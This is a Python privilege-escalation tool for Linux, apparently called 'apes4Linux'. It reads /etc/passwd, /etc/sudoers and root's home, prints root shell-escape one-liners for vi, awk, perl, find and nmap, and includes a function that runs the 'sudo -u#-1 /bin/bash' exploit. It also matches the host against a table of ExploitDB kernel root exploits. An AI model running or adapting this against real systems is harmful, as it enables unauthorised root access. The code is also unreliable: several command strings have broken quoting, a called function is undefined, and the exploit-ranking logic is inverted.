#!/usr/bin/env python

###########
# IMPORTS #
###########
try:
	import os
	import subprocess as subp
	compatibility = 0
except ImportError:
	import os
	compatibility = 1

import sys
import time
import getpass

##################
# DEFINE FORMATS #
##################

# COLOURS
RED   = "\033[1;31m"
GREEN = "\033[0;32m"
YELLOW = "\033[1;33m"
BLUE  = "\033[1;34m"
PURPLE = "\033[1;35m"
CYAN  = "\033[1;36m"
WHITE = "\033[0;37m"

RESET = "\033[0;0m"
BOLD	= "\033[;1m"
REVERSE = "\033[;7m"

BG_RED = "\033[;41m"
BG_YELLOW = "\033[;43m"

################
# PRINT BANNER #
################
def print_banner():
	line = BOLD + BLUE + "====================================================================="
	print(line)
	print(BOLD + BLUE + "=" + BOLD + CYAN + "                             _  _   _     _                    " + BOLD + BLUE + "    =")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "        __ _ _ __   ___  ___| || | | |   (_)_ __  _   ___  __" + BOLD + BLUE + "      =")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "       / _` | '_ \\ / _ \\/ __| || |_| |   | | '_ \\| | | \\ \\/ /" + BOLD + BLUE + "      =")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "      | (_| | |_) |  __/\\__ \\__   _| |___| | | | | |_| |>  < " + BOLD + BLUE + "      =")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "       \\__,_| .__/ \\___||___/  |_| |_____|_|_| |_|\\__,_/_/\\_\\" + BOLD + BLUE + "      =")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "            |_|                                              	" + BOLD + BLUE + "    =")
	
	print(line)
	print(BOLD + BLUE + "=" + BOLD + CYAN + "    Auto Privilege Escalation Enumeration & Execution for Linux    " + BOLD + BLUE + "=")
	print(BOLD + BLUE + "=" + BOLD + CYAN + "                  Made By: " + BOLD + RED + "Evander Marvel Kowira                   " + BOLD + BLUE + "=")
	print(line)

	print("\n" + line)
	print(BOLD + BLUE + "=" + BOLD + CYAN + "    [!] ENUMERATION COLOUR LEGEND (IDENTIFY RESULTS EASIER) [!]    " + BOLD + BLUE + "=")
	print(line)
	print(BOLD + BLUE + "=     " + BG_RED + YELLOW + "RED ON YELLOW:" + RESET + " " + BG_RED + YELLOW + "95% Privilege Escalation Vector" + BOLD + BLUE + "                =")
	print(BOLD + BLUE + "=               " + BOLD + RED + "RED:" + RESET + " " + BOLD + RED + "Files and Processes Owned by Root" + BOLD + BLUE + "              =")
	print(BOLD + BLUE + "=      " + BOLD + PURPLE + "LIGHT PURPLE:" + RESET + " " + BOLD + PURPLE + "Files and Processes Owned by Current User" + BOLD + BLUE + "      =")

	print(line + "\n")
	# x = 8
	# for i in range(x):
	# 	sys.stdout.write(BOLD + RED + "\r					   [|] PROGRAM IS LOADING... [|]\r")
	# 	time.sleep(0.2)
	# 	sys.stdout.write(BOLD + RED + "\r					   [/] PROGRAM IS LOADING... [/]\r")
	# 	time.sleep(0.2)
	# 	sys.stdout.write(BOLD + RED + "\r					   [-] PROGRAM IS LOADING... [-]\r")
	# 	time.sleep(0.2)
	# 	sys.stdout.write(BOLD + RED + "\r					   [\] PROGRAM IS LOADING... [\]\r")
	#  time.sleep(0.2)
	print(line)
	print(BOLD + BLUE + "=" + BOLD + RED + "             [!] Press Enter to Start Enumeration [!]              " + BOLD + BLUE + "=")
	print(line + "\n")

	try:
		input()
	except SyntaxError:
		pass

	# time.sleep(5)


	sys.stdout.write(RESET)


####################
# DEFINE FUNCTIONS #
####################

# Print Title Sequences
def print_title(text):
	sys.stdout.write(BOLD + BLUE)
	len_text = len(text) + 2
	print('=' * len_text)
	print(text)
	print('=' * len_text + '\n')
	sys.stdout.write(WHITE)

	#time.sleep(1)

def print_title2(text2):

	sys.stdout.write(BOLD + BLUE)
	len_text2 = len(text2) + 2
	print('=' * len_text2)
	print(text2)
	print('=' * len_text2 + '\n')
	sys.stdout.write(WHITE)

	#time.sleep(1)

# Execute Terminal Command
def execute_cmd(cmd_dict):
	for i in cmd_dict:
		cmd = cmd_dict[i]["cmd"]
		if compatibility == 0: # newer Python version, use subp
			out, error = subp.Popen([cmd], stdout=subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
			results = out.decode('utf-8').split('\n')
		else:
			echo_stdout = os.popen(cmd, 'r')
			results = echo_stdout.read().split('\n')
		cmd_dict[i]["results"]=results
	return cmd_dict

# Print Results
def print_result(cmd_dict):
	for i in cmd_dict:
		msg = cmd_dict[i]["msg"]
		results = cmd_dict[i]["results"]
		sys.stdout.write(BOLD + CYAN)
		print ("[+] " + msg)
		sys.stdout.write(WHITE)
		for result in results:
			if result != "" and "root" in result.split():
				sys.stdout.write(BOLD + RED)
				print("	" + result.strip())
				sys.stdout.write(WHITE)
			elif result != "" and me.strip() in result.split():
				sys.stdout.write(BOLD + PURPLE)
				print("	" + result.strip())
				sys.stdout.write(WHITE)
			elif result.strip('\n') != "":
				print("	" + result.strip())
		print("")
		sys.stdout.write(RESET)
	time.sleep(1)
	return

########################
# INITIALIZE VARIABLES #
########################

results=[]

######################
# CHECK CURRENT USER #
######################

def check_current_user():
	whoami = "whoami"
	out, err = subp.Popen(whoami, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
	me = str(out.decode())

	return me

##############
# ROOT CHECK #
##############
def root_check():
	text = "[#] CHECKING IF YOU ARE ROOT [#]"
	print_title(text)

	rootcheck = {
		"AMIROOT":{"cmd":"id", "msg":"Checking if You are Root...", "results":results}
	}

	rootcheck = execute_cmd(rootcheck)

	if "root" in rootcheck["AMIROOT"]["results"][0]:
		sys.stdout.write(BOLD + RED)
		print("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")
		sys.stdout.write(RESET)
		time.sleep(3)
	else:
		sys.stdout.write(BOLD + CYAN)
		print("[!] YOU ARE NOT ROOT\n")
		sys.stdout.write(RESET)

	return rootcheck


############################
# BASIC SYSTEM INFORMATION #
############################

def enum_basic_sysinfo():
	text = "[#] ENUMERATING BASIC SYSTEM INFORMATION [#]"
	print_title(text)

	#System Information
	system_info = {
		"OS":{"cmd":"egrep '^(VERSION|NAME)=' /etc/os-release","msg":"Operating System","results":results}, 
		"KERNEL":{"cmd":"cat /proc/version","msg":"Kernel","results":results}, 
		"PATH":{"cmd":"echo $PATH", "msg":"Path Variable", "results":results}
	}

	system_info = execute_cmd(system_info)
	print_result(system_info)

	return system_info

def enum_drive():
	text = "[#] ENUMERATING FILESYSTEM INFORMATION [#]"
	print_title(text)

	drive = {
		"PARTITIONS":{"cmd":"df -h","msg":"Partitions","results":results},
		"MOUNTED":{"cmd":"cat /etc/mtab","msg":"Mounted Devices","results":results},
		"FSTAB":{"cmd":"cat /etc/fstab 2>/dev/null","msg":"Entries in fstab","results":results}
	}

	drive = execute_cmd(drive)
	print_result(drive)

	return drive

######################
# Installed Software #
######################

def enum_installed_software():
	text = "[#] ENUMERATING INSTALLED SOFTWARE [#]"
	print_title(text)

	useful_software = {
		"USEFUL BINARIES":{"cmd":"which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null", "msg":"Useful Binaries in the System","results":results}
	}

	useful_software = execute_cmd(useful_software)
	print_result(useful_software)

	return useful_software


def enum_compilers():
	text = "[#] ENUMERATING INSTALLED COMPILERS [#]"
	print_title(text)

	compilers = {
		"COMPILERS":{"cmd":"dpkg --list 2>/dev/null | grep 'compiler' || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; command -v gcc g++ 2>/dev/null || locate -r '/gcc[0-9\.-]\+$' 2>/dev/null | grep -v "/doc/")","msg":"Installed Compilers","results":results}
		}

	compilers = execute_cmd(compilers)
	print_results(compilers)


#######################
# NETWORK INFORMATION #
#######################

def enum_network_info():
	text = "[#] ENUMERATING NETWORK INFORMATION [#]"
	print_title(text)

	# Hosts
	hosts = {
		"HOSTNAME":{"cmd":"cat /etc/hostname", "msg":"Hostname", "results":results},
		"HOSTS":{"cmd":"cat /etc/hosts /etc/resolv.conf", "msg":"Hosts", "results":results},
		"DNS":{"cmd":"dnsdomainname", "msg":"DNS Domain Name", "results":results},
	}

	hosts = execute_cmd(hosts)
	print_result(hosts)

	network_info = {
		"NETWORKS":{"cmd":"cat /etc/networks", "msg":"Existing Networks", "results":results},
		"INTERFACES":{"cmd":"ifconfig || ip a", "msg":"Interfaces", "results":results},
		"ARP":{"cmd":"arp -e || arp -a", "msg":"ARP Table","results":results},
		"ROUTE":{"cmd":"route || ip n", "msg":"Route","results":results},
		"NETSTAT":{"cmd":"netstat -atulpn | grep -v 'TIME_WAIT'","msg":"Netstat","results":results}
	}

	network_info = execute_cmd(network_info)
	print_result(network_info)

	firewall_info = {
		"IPTABLES":{"cmd":"(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v '^#'' | grep -Pv '\W*\#'' 2>/dev/null)","msg":"iptables Rules","results":results}
	}

	firewall_info = execute_cmd(firewall_info)
	print_result(firewall_info)


# Xinetd Check
def check_xinetd():
	xinetd = {
		"INETD":{"cmd":"cat /etc/inetd.conf", "msg":"inetd Configuration", "results":results},
		"XINETD":{"cmd":"cat /etc/xinetd.conf", "msg":"xinetd Configuration", "results":results}
	}

	xinetd = execute_cmd(xinetd)
	print_result(xinetd)

# Open Ports
def enum_open_ports():
	text = "[#] ENUMERATING OPEN PORTS [#]"
	print_title(text)

	open_ports = {
		"OPEN_PORTS":{"cmd":"netstat -punta || ss --ntpu | grep '127.0'", "msg":"Open Ports", "results":results}
	}

	open_ports = execute_cmd(open_ports)
	print_result(open_ports)


######################
# EXISTING CRON JOBS #
######################

def enum_cronjob():
	text = "[#] ANY CRONJOBS RUNNING FOR CURRENT USER? [#]"
	print_title(text)

	cronjobs = {
		"CURRENT_USER_CRONJOB":{"cmd":"crontab -l", "msg":"CRONJOBS FOR CURRENT USER", "results":results}
	}

	return cronjobs

## FOR HIGH VERBOSITY

def enum_all_cronjobs():
	all_cronjobs = {
		"ALL_CRONJOBS":{"cmd":"ls -al /etc/cron* /etc/at*", "msg":"ALL CRONJOBS", "results":results}
	}

	all_cronjobs = execute_cmd(all_cronjobs)
	print_result(all_cronjobs)


####################
# USER ENUMERATION #
####################

def enum_users():
	text = "[#] ENUMERATING USERS [#]"
	print_title(text)

	user_info = {
		"WHOAMI":{"cmd":"id || (whoami && groups) 2>/dev/null", "msg":"Who Am I?", "results":results},
		#"SUDO":{"cmd":"{ echo '" + sudo_password + "'; } | sudo -l", "msg":"What Can I Run as Sudo?", "results":results},
		"ALL_USERS":{"cmd":"cat /etc/passwd | cut -d: -f1", "msg":"All Users", "results":results},
		"SUDOERS": {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg": "Sudoers (privileged)", "results": results},
		"SUPERUSERS":{"cmd":"awk -F: '($3 == '0') {print}' /etc/passwd 2>/dev/null", "msg":"Superusers", "results":results},
		"CURRENT_LOGGED_IN":{"cmd":"w 2>/dev/null", "msg":"Currently Logged In Users", "results":results}
	}

	user_info = execute_cmd(user_info)
	print_result(user_info)

	return user_info

#########################
# FILES AND DIRECTORIES #
#########################

def enum_files():
	text = "[#] ENUMERATING FILES AND DIRECTORIES PERMISSIONS"
	print_title(text)

	file_permissions = { 
		"WWDIRSROOT": {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root", "msg": "World Writeable Directories for User/Group 'Root'", "results": results},
		"WWDIRS": {"cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root", "msg": "World Writeable Directories for Users other than Root", "results": results},
		"WWFILES": {"cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null", "msg": "World Writable Files", "results": results},
		"ROOTHOME": {"cmd": "ls -ahlR /root 2>/dev/null", "msg": "Checking if root's home folder is accessible", "results": []}	
	}

	file_permissions = execute_cmd(file_permissions)
	print_result(file_permissions)

##############################
# PROCESSES AND APPLICATIONS #
##############################

def enum_proc_app():
	text = "[#] ENUMERATING RUNNING PROCESSES AND APPLICATIONS [#]"
	print_title(text)

	if "Debian" in system_info["KERNEL"]["results"][0] or "Ubuntu" in system_info["KERNEL"]["results"][0]:
		get_packagemng = "dpkg -l | awk '{$1=$4=\"\"; print $0}'" #Debian Package Manager
	else:
		get_packagemng = "rpm -qa | sort -u" #Red Hat Linux Package Manager

	# All Mode
	processes = {
		"PROCESSES":{"cmd":"ps aux | awk '{print $1,$2,$9,$10,$11}'", "msg":"Running Processes", "results":results},
		"PACKAGES":{"cmd":get_packagemng, "msg":"Installed Packages", "results": results}
	}

	processes = execute_cmd(processes)
	print_result(processes)

	return processes

#########################################################################################################################################################
#########################################################################################################################################################
#########################################################################################################################################################
#########################################################################################################################################################

################################
# EXPLOIT FINDER AND SUGGESTER #
################################

# CHECK FOR LANGUAGES AND TOOLS WHICH CAN ASSIST PRIVILEGE ESCALATION
def enum_langtool():
	text = "[#] INSTALLED LANGUAGES OR TOOLS FOR BUILDING EXPLOITS [#]"
	print_title(text)

	langtools = {
		"LANGTOOLS":{"cmd":"which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null", "msg":"Installed Languages and Tools for Exploit Development", "results":results}
	}

	langtools = execute_cmd(langtools)
	print_result(langtools)

	return langtools

# CHECK FOR POSSIBLE SHELL ESCAPE SEQUENCES
def enum_shellescape(langtool):
	text = "[#] POSSIBLE CORRESPONDING SHELL ESCAPE COMMANDS TO GET ROOT [#]"
	print_title(text)

	escape_cmd = {
		"vi":[":!bash", ":set shell=/bin/bash:shell"],
		"awk":["awk 'BEGIN {system(\"/bin/bash\")}'"],
		"perl":["perl -e 'exec \"/bin/bash\";'"],
		"find":["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
		"nmap":["--interactive"]
	}

	for cmd in escape_cmd:
		for result in langtools["LANGTOOLS"]["results"]:
			if cmd in result:
				for item in escape_cmd[cmd]:
					print("	" + cmd + "  ->\t" + item)
	print("")

# CHECK FOR SUDO EXPLOIT BELOW SUDO 1.28
def check_sudo_ver():
	check_sudo_ver = {
		"SUDO_VERSION":{"cmd":"sudo -V | grep 'Sudo ver'","msg":"Sudo Version","results":results}
	}

	# check if sudo version is 1.28 or below
	check_sudo_ver = execute_cmd(check_sudo_ver)
	print_result(check_sudo_ver)

	cmd = "sudo -V | grep 'Sudo ver' | cut -c 14-16"
	if compatibility == 0:
		out, err = subp.Popen(cmd, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
		sudo_version = float(out.decode())
	else:
		echo_stdout = os.popen(cmd, 'r')
		sudo_version = float(echo_stdout.read())

	is_sudo128 = False

	if (sudo_version < 1.29):
		sys.stdout.write(BG_RED + YELLOW)
		print("	" + RESET + "Sudo is vulnerable, run the following command to obtain root access." + RESET)
		sys.stdout.write(BOLD)
		print("[*] sudo -u#-1 /bin/bash\n")
		is_sudo128 = True
	else:
		sys.stdout.write(CYAN)
		print("	" + RESET + "Sudo is not vulnerable." + RESET +"\n")

	sys.stdout.write(RESET)

	return is_sudo128

def exploit_sudo128():
	cmd = "sudo -u#-1 /bin/bash"
	if compatibility == 0:
		out, err = subp.Popen(cmd, stdout= subp.PIPE, stderr=subp.PIPE, shell=True).communicate()
	else:
		echo_stdout = os.system(cmd)

# EXPLOIT FINDER FOR LINUX KERNEL 2.x
def search_exploits(system_info, langtools, processes, drive):
	text = "[#] SEARCHING PRIVILEGE ESCALATION EXPLOITS [#]"
	print_title(text)

	# exploit format: exploit name: {minver,maxver,exploitdb_number,language, keywords}
	exploits = {
		"2.2.x-2.4.x ptrace kmod local exploit": {"minver": "2.2", "maxver": "2.4.99", "exploitdb": "3", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.4.20 Module Loader Local Root Exploit": {"minver": "0", "maxver": "2.4.20", "exploitdb": "12", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4.22 "'do_brk()'" local Root Exploit (PoC)": {"minver": "2.4.22", "maxver": "2.4.22", "exploitdb": "129", "lang": "asm", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"<= 2.4.22 (do_brk) Local Root Exploit (working)": {"minver": "0", "maxver": "2.4.22", "exploitdb": "131", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4.x mremap() bound checking Root Exploit": {"minver": "2.4", "maxver": "2.4.99", "exploitdb": "145", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"<= 2.4.29-rc2 uselib() Privilege Elevation": {"minver": "0", "maxver": "2.4.29", "exploitdb": "744", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4 uselib() Privilege Elevation Exploit": {"minver": "2.4", "maxver": "2.4", "exploitdb": "778", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "895", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4/2.6 bluez Local Root Privilege Escalation Exploit (update)": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "926", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "bluez"}},
		"<= 2.6.11 (CPL 0) Local Root Exploit (k-rad3.c)": {"minver": "0", "maxver": "2.6.11", "exploitdb": "1397", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit": {"minver": "0", "maxver": "99", "exploitdb": "1518", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "mysql"}},
		"2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit": {"minver": "2.6.13", "maxver": "2.6.17.4", "exploitdb": "2004", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (2)": {"minver": "2.6.13", "maxver": "2.6.17.4", "exploitdb": "2005", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (3)": {"minver": "2.6.13", "maxver": "2.6.17.4", "exploitdb": "2006", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (4)": {"minver": "2.6.13", "maxver": "2.6.17.4", "exploitdb": "2011", "lang": "sh", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"<= 2.6.17.4 (proc) Local Root Exploit": {"minver": "0", "maxver": "2.6.17.4", "exploitdb": "2013", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.13 <= 2.6.17.4 prctl() Local Root Exploit (logrotate)": {"minver": "2.6.13", "maxver": "2.6.17.4", "exploitdb": "2031", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit": {"minver": "4.10", "maxver": "7.04", "exploitdb": "3384", "lang": "c", "keywords": {"loc": ["os"], "val": "debian"}},
		"Linux/Kernel 2.4/2.6 x86-64 System Call Emulation Exploit": {"minver": "2.4", "maxver": "2.6", "exploitdb": "4460", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.11.5 BLUETOOTH Stack Local Root Exploit": {"minver": "0", "maxver": "2.6.11.5", "exploitdb": "4756", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "bluetooth"}},
		"2.6.17 - 2.6.24.1 vmsplice Local Root Exploit": {"minver": "2.6.17", "maxver": "2.6.24.1", "exploitdb": "5092", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.23 - 2.6.24 vmsplice Local Root Exploit": {"minver": "2.6.23", "maxver": "2.6.24", "exploitdb": "5093", "lang": "c", "keywords": {"loc": ["os"], "val": "debian"}},
		"Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit": {"minver": "0", "maxver": "99", "exploitdb": "5720", "lang": "python", "keywords": {"loc": ["os"], "val": "debian"}},
		"Linux Kernel < 2.6.22 ftruncate()/open() Local Exploit": {"minver": "0", "maxver": "2.6.22", "exploitdb": "6851", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.29 exit_notify() Local Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.29", "exploitdb": "8369", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6 UDEV Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8478", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
		"2.6 UDEV < 141 Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8572", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
		"2.6.x ptrace_attach Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8673", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.29 ptrace_attach() Local Root Race Condition Exploit": {"minver": "2.6.29", "maxver": "2.6.29", "exploitdb": "8678", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit": {"minver": "0", "maxver": "2.6.28.3", "exploitdb": "9083", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Test Kernel Local Root Exploit 0day": {"minver": "2.6.18", "maxver": "2.6.30", "exploitdb": "9191", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"PulseAudio (setuid) Priv. Escalation Exploit (ubu/9.04)(slack/12.2.0)": {"minver": "2.6.9", "maxver": "2.6.30", "exploitdb": "9208", "lang": "c", "keywords": {"loc": ["pkg"], "val": "pulse"}},
		"2.x sock_sendpage() Local Ring0 Root Exploit": {"minver": "2", "maxver": "2.99", "exploitdb": "9435", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.x sock_sendpage() Local Root Exploit 2": {"minver": "2", "maxver": "2.99", "exploitdb": "9436", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver)": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9479", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6 < 2.6.19 (32bit) ip_append_data() ring0 Root Exploit": {"minver": "2.6", "maxver": "2.6.19", "exploitdb": "9542", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4/2.6 sock_sendpage() Local Root Exploit (ppc)": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9545", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9574", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.19 udp_sendmsg Local Root Exploit": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9575", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4/2.6 sock_sendpage() Local Root Exploit [2]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9598", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4/2.6 sock_sendpage() Local Root Exploit [3]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9641", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation": {"minver": "2.4.1", "maxver": "2.6.32", "exploitdb": "9844", "lang": "python", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"'pipe.c' Local Privilege Escalation Vulnerability": {"minver": "2.4.1", "maxver": "2.6.32", "exploitdb": "10018", "lang": "sh", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.6.18-20 2009 Local Root Exploit": {"minver": "2.6.18", "maxver": "2.6.20", "exploitdb": "10613", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Apache Spamassassin Milter Plugin Remote Root Command Execution": {"minver": "0", "maxver": "99", "exploitdb": "11662", "lang": "sh", "keywords": {"loc": ["proc"], "val": "spamass-milter"}},
		"<= 2.6.34-rc3 ReiserFS xattr Privilege Escalation": {"minver": "0", "maxver": "2.6.34", "exploitdb": "12130", "lang": "python", "keywords": {"loc": ["mnt"], "val": "reiser"}},
		"Ubuntu PAM MOTD local root": {"minver": "7", "maxver": "10.04", "exploitdb": "14339", "lang": "sh", "keywords": {"loc": ["os"], "val": "ubuntu"}},
		"< 2.6.36-rc1 CAN BCM Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36", "exploitdb": "14814", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Kernel ia32syscall Emulation Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "15023", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Linux RDS Protocol Local Privilege Escalation": {"minver": "0", "maxver": "2.6.36", "exploitdb": "15285", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"<= 2.6.37 Local Privilege Escalation": {"minver": "0", "maxver": "2.6.37", "exploitdb": "15704", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.37-rc2 ACPI custom_method Privilege Escalation": {"minver": "0", "maxver": "2.6.37", "exploitdb": "15774", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"CAP_SYS_ADMIN to root Exploit": {"minver": "0", "maxver": "99", "exploitdb": "15916", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)": {"minver": "0", "maxver": "99", "exploitdb": "15944", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"< 2.6.36.2 Econet Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36.2", "exploitdb": "17787", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Sendpage Local Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "19933", "lang": "ruby", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.4.18/19 Privileged File Descriptor Resource Exhaustion Vulnerability": {"minver": "2.4.18", "maxver": "2.4.19", "exploitdb": "21598", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.2.x/2.4.x Privileged Process Hijacking Vulnerability (1)": {"minver": "2.2", "maxver": "2.4.99", "exploitdb": "22362", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"2.2.x/2.4.x Privileged Process Hijacking Vulnerability (2)": {"minver": "2.2", "maxver": "2.4.99", "exploitdb": "22363", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"Samba 2.2.8 Share Local Privilege Elevation Vulnerability": {"minver": "2.2.8", "maxver": "2.2.8", "exploitdb": "23674", "lang": "c", "keywords": {"loc": ["proc", "pkg"], "val": "samba"}},
		"open-time Capability file_ns_capable() - Privilege Escalation Vulnerability": {"minver": "0", "maxver": "99", "exploitdb": "25307", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
		"open-time Capability file_ns_capable() Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "25450", "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
	}

	osx = system_info["OS"]["results"][0]
	versionx = system_info["KERNEL"]["results"][0].split(" ")[2].split("-")[0]
	langtoolsx = langtools["LANGTOOLS"]["results"]
	procs = processes["PROCESSES"]["results"]
	kernelx = str(system_info["KERNEL"]["results"][0])
	mountx = drive["MOUNTED"]["results"]

	# RANK POSSIBILITY OF DETECTED PRIVILEGE ESCALATION EXPLOITS
	low_chance = []
	high_chance = []

	for exploit in exploits:
		language = 0
		keyword = exploits[exploit]["keywords"]["val"]
		exploit_output = exploit + " :: " + "http://www.exploitdb.com/exploits/" + exploits[exploit]["exploitdb"] + " :: Language: " + exploits[exploit]["lang"]
		# check kernel version
		if (versionx >= exploits[exploit]["minver"]) and (versionx <= exploits[exploit]["maxver"]):
			# check language applicability
			if (exploits[exploit]["lang"] == "c") and ("gcc" in str(langtoolsx)) or ("cc" in str(langtoolsx)):
				language = 1
			elif exploits[exploit]["lang"] == "sh":
				language = 1
			elif exploits[exploit]["lang"] in str(langtoolsx):
				language = 1
			if language == 0:
				exploit_output = exploit_output + " (Language Not Detected On System)"
				#check keyword
				for loc in exploits[exploit]["keywords"]["loc"]:
					if loc == "proc":
						for proc in procs:
							if keyword in proc:
								high_chance.append(exploit_output)
								break
					elif loc == "os":
						if (keyword in osx) or (keyword in kernelx):
							high_chance.append(exploit_output)
							break
					elif loc == "mnt":
						if keyword in mountx:
							high_chance.append(exploit_output)
							break
					else:
						low_chance.append(exploit_output)

	sys.stdout.write(BOLD + RED)
	print("[*] High Probability Exploits")
	if high_chance:
		for exploit in high_chance:
			print("	" + exploit)
		print("\n")
	else:
		print("\n	No high probability exploit found in ExploitDB.\n")


	sys.stdout.write(BOLD + YELLOW)
	print("[*] Low Probability Exploits")
	if low_chance:
		for exploit in low_chance:
			print("	" + exploit)
		print("\n")
